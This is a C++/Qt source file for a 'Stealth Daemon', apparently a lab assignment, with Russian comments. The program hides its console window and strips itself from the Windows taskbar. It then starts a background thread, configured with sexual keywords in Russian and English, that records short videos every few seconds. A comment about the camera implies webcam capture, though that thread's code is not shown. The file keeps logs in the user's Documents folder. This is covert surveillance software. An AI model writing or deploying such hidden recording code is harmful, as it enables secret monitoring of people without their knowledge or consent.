#include <QCoreApplication>
#include <QTimer>
#include <QDebug>
#include <QDir>
#include <QStandardPaths>
#include <QFile>
#include <QTextStream>
#include <QThread>
#include <windows.h>
#include "stealthdaemon.h"
#include "lab4_logger.h"
#include <QLibraryInfo>
#include <QFileInfo>

// Функция для скрытия консольного окна
void hideConsoleWindow()
{
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

// Функция для скрытия процесса из панели задач
void hideFromTaskbar()
{
    // Получаем handle главного окна приложения
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        // Скрываем окно
        ShowWindow(hwnd, SW_HIDE);
        
        // Убираем из панели задач
        LONG_PTR exStyle = GetWindowLongPtr(hwnd, GWL_EXSTYLE);
        exStyle |= WS_EX_TOOLWINDOW;
        exStyle &= ~WS_EX_APPWINDOW;
        SetWindowLongPtr(hwnd, GWL_EXSTYLE, exStyle);
    }
}

// Функция для создания файла-маркера
void createDaemonMarker()
{
    QString documentsPath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation);
    QString markerPath = documentsPath + "/Lab4_StealthLogs/daemon_running.txt";
    
    QDir().mkpath(QFileInfo(markerPath).absolutePath());
    
    QFile markerFile(markerPath);
    if (markerFile.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&markerFile);
        out << "Stealth Daemon is running\n";
        out << "Started at: " << QDateTime::currentDateTime().toString() << "\n";
        out << "PID: " << QCoreApplication::applicationPid() << "\n";
        markerFile.close();
    }
}

// Функция для удаления файла-маркера
void removeDaemonMarker()
{
    QString documentsPath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation);
    QString markerPath = documentsPath + "/Lab4_StealthLogs/daemon_running.txt";
    
    QFile::remove(markerPath);
}

// Записывает отладочную информацию о старте демона
static void writeStartupInfo()
{
    const QString documentsPath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation);
    const QString logDir = documentsPath + "/Lab4_StealthLogs";
    QDir().mkpath(logDir);
    const QString infoPath = logDir + "/daemon_startup_info.txt";

    QFile f(infoPath);
    if (f.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&f);
        out << "Executable: " << QCoreApplication::applicationFilePath() << "\n";
        out << "CWD:        " << QDir::currentPath() << "\n";
        out << "Qt version: " << qVersion() << "\n";
        out << "PID:        " << QCoreApplication::applicationPid() << "\n";
        out << "QT_PLUGIN_PATH: " << qgetenv("QT_PLUGIN_PATH") << "\n";
        out << "PATH contains Qt? " << (QString::fromLocal8Bit(qgetenv("PATH")).contains("Qt5.5.1") ? "yes" : "no") << "\n";
        const QString plat = QCoreApplication::applicationDirPath() + "/platforms/qwindows.dll";
        out << "platforms/qwindows.dll present: " << (QFileInfo::exists(plat) ? "yes" : "no") << " -> " << plat << "\n";
        f.close();
    }
}

// Функция записи heartbeat в файл
static void writeHeartbeat()
{
    const QString documentsPath = QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation);
    const QString logDir = documentsPath + "/Lab4_StealthLogs";
    QDir().mkpath(logDir);
    const QString hbPath = logDir + "/daemon_heartbeat.txt";
    QFile f(hbPath);
    if (f.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&f);
        out << "alive: " << QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss.zzz") << "\n";
        out << "pid:   " << QCoreApplication::applicationPid() << "\n";
        f.close();
    }
}

int main(int argc, char *argv[])
{
    QCoreApplication app(argc, argv);
    
    // Скрываем консольное окно и убираем из панели задач
    hideConsoleWindow();
    hideFromTaskbar();
    
    qDebug() << "Stealth Daemon starting...";
    Lab4Logger::instance()->logStealthDaemonEvent("Stealth Daemon executable started");
    
    // Создаем файл-маркер для отслеживания работы демона
    createDaemonMarker();
    writeStartupInfo();
    
    // Даем главному приложению время освободить камеру и плагины
    QThread::msleep(800);
    
    // Создаем поток демона
    StealthDaemonThread* daemonThread = new StealthDaemonThread();
    
    // НАСТРОЙКИ ДЛЯ LAB4: каждые 5 секунд снимать видео на 4 секунды
    QStringList keywords;
    keywords << "сэкс" << "порно" << "секс" << "porn" << "sex" << "xxx" << "nude" << "naked" 
             << "голый" << "голая" << "обнаженный" << "обнаженная";
    daemonThread->setKeywords(keywords);
    daemonThread->setPhotoInterval(5); // 5 секунд между видео
    daemonThread->setVideoDuration(4); // 4 секунды записи видео
    daemonThread->setLoggingEnabled(true);
    
    // Запускаем демон в отдельном потоке
    daemonThread->start();
    
    Lab4Logger::instance()->logStealthDaemonEvent("Stealth Daemon started successfully in background - Lab4 mode: 5s interval, 4s duration");
    
    // Heartbeat (видно по файлу, что демон жив)
    QTimer heartbeat;
    heartbeat.setInterval(2000);
    QObject::connect(&heartbeat, &QTimer::timeout, [](){ writeHeartbeat(); });
    writeHeartbeat();
    heartbeat.start();
    
    // Держим фоновый процесс живым: используем event loop приложения
    int rc = app.exec();
    
    qDebug() << "Stealth Daemon finished";
    Lab4Logger::instance()->logStealthDaemonEvent("Stealth Daemon executable finished");
    
    // Удаляем файл-маркер
    removeDaemonMarker();
    
    delete daemonThread;
    return rc;
}
